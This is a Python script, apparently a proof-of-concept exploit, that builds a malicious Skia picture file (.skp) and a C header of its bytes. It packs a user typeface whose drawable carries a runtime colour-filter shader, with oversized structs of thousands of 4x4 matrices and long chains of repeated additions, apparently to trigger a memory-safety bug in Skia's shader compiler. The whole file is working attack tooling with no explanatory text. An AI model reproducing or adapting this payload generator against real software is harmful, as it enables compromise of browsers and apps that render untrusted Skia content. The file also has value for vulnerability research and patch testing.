import struct

data = b'skiapict'
data += struct.pack('<IffffB', 104, 0, 0, 400, 400, 1)

def makeFourByteTag(a, b, c, d):
    return (ord(a) << 24) | (ord(b) << 16) | (ord(c) << 8) | ord(d)

# There's a bug at how I'm serializing strings atm, so I'm padding
# end of strings with '\0', but this causes issues when serializing shaders somehow
# so I'm padding the end of shaders with ' ' before calling this so we don't need to add extra \0's.
def write_string(s):
    result = b''

    s += '\0'

    while len(s) % 4 != 0:
        s += '\0'

    result += struct.pack('<I', len(s) - 1)

    for c in s:
        result += struct.pack('<B', ord(c))

    return result

def write_raw_string(s):
    result = b''

    for c in s:
        result += struct.pack('<b', ord(c))

    return result

def write_tpfc_tag():
    global data
    
    tagData = b''

    tagData += struct.pack('<BI', 0xFF, 0)

    # Add a factory id
    tagData += struct.pack('<BI', 0xFF, 252)
    tagData += struct.pack('<BI', 0xFF, makeFourByteTag('u', 's', 'e', 'r'))

    tagData += struct.pack('<BI', 0xFF, 0xFF) # kSentinel (no data)

    # Write header
    tpfcStream = write_raw_string('SkUserTypeface01')
    
    # Write font metrics
    tpfcStream += struct.pack('<I',0)
    tpfcStream += struct.pack('<f',-1)
    tpfcStream += struct.pack('<f',-1)
    tpfcStream += struct.pack('<f',2)
    tpfcStream += struct.pack('<f',2)
    tpfcStream += struct.pack('<f',2)
    tpfcStream += struct.pack('<f',0)
    tpfcStream += struct.pack('<f',0)
    tpfcStream += struct.pack('<f',-1)
    tpfcStream += struct.pack('<f',24)
    tpfcStream += struct.pack('<f',0)
    tpfcStream += struct.pack('<f',0)
    tpfcStream += struct.pack('<f',2)
    tpfcStream += struct.pack('<f',0)
    tpfcStream += struct.pack('<f',1)
    tpfcStream += struct.pack('<f',0)

    tpfcStream += struct.pack('<i',400 << 16)
    
    tpfcStream += struct.pack('<I',1)
    tpfcStream += struct.pack('<I',1)
    tpfcStream += struct.pack('<f',24)
    tpfcStream += struct.pack('<ffff',0,0,24,24)

    drawableStream = b''
    drawableStream += write_string('SkRecordedDrawable')

    drawableShaderPayload = b''

    drawableShaderPayload += struct.pack('<ffffII', 0, 0, 400, 400, makeFourByteTag('p', 'n', 't', ' '), 1)
    drawableShaderPayload += struct.pack('<ffffffII', 0, 0, 1, 1, 1, 1, 2 << 24, 0)

    drawableShaderPayload += struct.pack('<II', 0, 0)

    drawableShaderPayload += write_string('SkRuntimeColorFilter')

    NUM_STRUCT_MEMBERS1 = 6200
    NUM_STRUCT_MEMBERS2 = 433

    shader = 'struct M {\n'

    shader += 'float4x4 '

    for i in range(0, NUM_STRUCT_MEMBERS1):
        if i > 0:
            shader += ','
        if i != 0:
            shader += f'm{i:x}'
        else:
            shader += f'm'
    shader += ';\n'
    shader += '};\n\n'

    shader += 'struct M2 {\n'

    shader += 'float4x4 '

    for i in range(0, NUM_STRUCT_MEMBERS2):
        if i > 0:
            shader += ','
        if i != 0:
            shader += f'm{i:x}'
        else:
            shader += f'm'
    shader += ';\n'
    shader += '};\n\n'

    shader += 'M f() {\n'

    shader += '  M m; return m;\n'

    shader += '}\n\n'

    num_const_members = 40

    shader += 'struct T {\n  float4x4 '
    for i in range(0, num_const_members):
        if i > 0:
            shader += ','
        shader += f'm{i:x}'
    shader += ';\n};\n'

    shader += 'const T K = T('

    for i in range(0, num_const_members):
        if i > 0:
            shader += ','
        shader += 'mat4x4(1337)'
    shader += ');\n'

    shader += 'half4 main(half4 coords) {\n'

    shader += '  float4x4 a = M2('

    for j in range(NUM_STRUCT_MEMBERS2):
        if j > 0:
            shader += ","

        num_add_ops = 23 if j == NUM_STRUCT_MEMBERS1 - 1 else 25
        for i in range(num_add_ops):
            if i > 0:
                shader += '+'
            shader += 'f().m'

    shader += ").m\n"
    shader += ";\n"
    shader += '  return half4(a[0]+(K.m0+K.m1+K.m2+K.m3)[0]);\n'
    shader += '}'

    # Do NOT remove, since removing this will cause deserialization to fail.
    while len(shader) % 4 != 3:
        shader += ' '

    runtimeShaderPayload = write_string(shader)

    runtimeShaderPayload += struct.pack('<II', 0, 0)

    drawableShaderPayload += struct.pack('<I', len(runtimeShaderPayload)) + runtimeShaderPayload

    drawableShaderPayload += struct.pack('<II', 0, 0)

    drawableShaderPayload += struct.pack('<I', makeFourByteTag('r', 'e', 'a', 'd'))
    
    pob = b''
    pob += struct.pack('<I', 13 << 24 | 8) # DrawPaint
    pob += struct.pack('<I', 1) # paint number (1 = first paint)

    drawableShaderPayload += struct.pack('<I', len(pob)) * 2 + pob

    drawableShaderPayload += struct.pack('<I', makeFourByteTag('e', 'o', 'f', ' '))

    drawableStream += struct.pack('<i', len(drawableShaderPayload))
    drawableStream += drawableShaderPayload
    
    # Ensure 4 byte alignment of stream data
    if len(drawableStream) % 4 != 0:
        drawableStream += struct.pack('<B', 0) * (4 - len(drawableStream) % 4)

    tpfcStream += struct.pack('<Q', len(drawableStream)) + drawableStream

    if len(tpfcStream) % 4 != 0:
        tpfcStream += struct.pack('<B', 0) * (4 - len(tpfcStream) % 4)

    tagData += struct.pack('<BI', 0xFF, len(tpfcStream)) + tpfcStream
    
    data += struct.pack('<II', makeFourByteTag('t', 'p', 'f', 'c'), 1) + tagData

def register_textblob():
    global data

    data += struct.pack('<III', makeFourByteTag('f', 'a', 'c', 't'), 4, 0)

    blob_pict_buffer = struct.pack('<ffffIIff', 0, 0, 400, 400, 1, 0, 0, 0)
    blob_pict_buffer += struct.pack('<IfI', 1 << 28, 24, 1)
    blob_pict_buffer += struct.pack('<IHH', 2, 0, 0) # First 0 is a glyph index, the second one is just padding.
    blob_pict_buffer += struct.pack('<I', 0)
    blob_pict_buffer += struct.pack('<I', 0) # end of runs
    blob_pict_buffer = struct.pack('<II', makeFourByteTag('b', 'l', 'o', 'b'), 1) + blob_pict_buffer

    paint_pict_buffer = struct.pack('<II', makeFourByteTag('p', 'n', 't', ' '), 1) + struct.pack('<ffffffI', 0, 0, 1, 1, 1, 1, 0)

    data += struct.pack('<II', makeFourByteTag('a', 'r', 'a', 'y'), len(blob_pict_buffer) + len(paint_pict_buffer)) + blob_pict_buffer + paint_pict_buffer

def write_textblob_draw_op():
    global data

    pob = struct.pack('<i', (45 << 24) | 16)
    pob += struct.pack('<IIff', 1, 1, 0, 0)

    data += struct.pack('<I', makeFourByteTag('r', 'e', 'a', 'd')) + struct.pack('<I', len(pob))
    data += pob

def write_eof_tag():
    global data
    
    data += struct.pack('<I', makeFourByteTag('e', 'o', 'f', ' '))

write_tpfc_tag()
register_textblob()
write_textblob_draw_op()
write_eof_tag()

with open('pic.skp', 'wb') as f:
    f.write(data)

src = '#pragma once\n\n'
src += 'unsigned char kSkiaPictureBytes[] = {\n'

num_bytes = len(data)

j = 0
while num_bytes != 0:
    src += '  '
    for i in range(0, min(num_bytes, 20)):
        src += "0x{:02x}".format(data[j])

        if j != len(data) - 1:
            src += ', '

        j += 1

    src += '\n'
    num_bytes -= min(num_bytes, 20)

src += '};'

with open('drawable_picture.skp.hh', 'w') as skp_cc:
    skp_cc.write(src)
